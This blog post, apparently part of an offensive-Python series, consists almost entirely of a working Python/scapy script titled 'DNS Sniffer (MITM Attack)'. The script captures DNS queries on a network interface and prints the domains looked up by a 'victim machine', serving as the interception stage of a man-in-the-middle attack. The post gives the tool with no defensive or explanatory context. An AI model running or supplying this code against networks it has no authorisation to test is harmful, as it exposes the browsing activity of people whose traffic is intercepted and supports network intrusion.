---
layout: single
title: DNS Sniffer - Python
excerpt: "DNS Sniffer (MITM Attack)."
date: 2025-03-16
classes: wide
header:
  teaser: /img2/images/python.jpg"
  teaser_home_page: true
  icon: /img2/python.ico
categories:
  - Python
  - Scripts
tags:
  - Python Ofensivo
  - MITM
---

```python
import re
import os
import signal
import sys
import subprocess
import argparse
import scapy.all as scapy
from termcolor import colored


def def_handler(sig,frame): 
  print(colored(f"\n[!] Saliendo del programa...\n","red"))
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler) 

def get_arguments(): 
  parser=argparse.ArgumentParser(description="DNS Sniffer")
  parser.add_argument("-i", "--interface", required=True,dest="interface", help="Interface to sniff")

  return parser.parse_args()


def root(): 
  if subprocess.check_output(["whoami"]).decode().strip() == 'root':
    return True


def process_dns_packet(packet): 
  if packet.haslayer(scapy.DNSQR): 
    domain = packet[scapy.DNSQR].qname.decode() 

    exclude_keywords=["google", "cloud", "bing", "static"] 

    if domain not in domains_seen and not any(keyword in domain for keyword in exclude_keywords): 
                        
      domains_seen.add(domain) 
      split_domain=domain.split(".") 
      if re.findall("www", domain): 
        print(colored(f"[+] Domain: {domain}","green"))
      elif len(split_domain) == 3:
        print(colored(f"[+] Domain: {domain}","green"))
      else:
        print(f"[+] Domain: {domain}")


def set_global(): 
  global domains_seen
  domains_seen = set()


def main():
  if root():
    os.system("clear")
    set_global()

    arguments=get_arguments()

    print(colored("\n[+] Interceptando paquetes de la máquina víctima:\n","yellow"))
    scapy.sniff(iface=arguments.interface, filter="udp and port 53", prn=process_dns_packet, store=0) 


if __name__ == '__main__':
  main()
  ```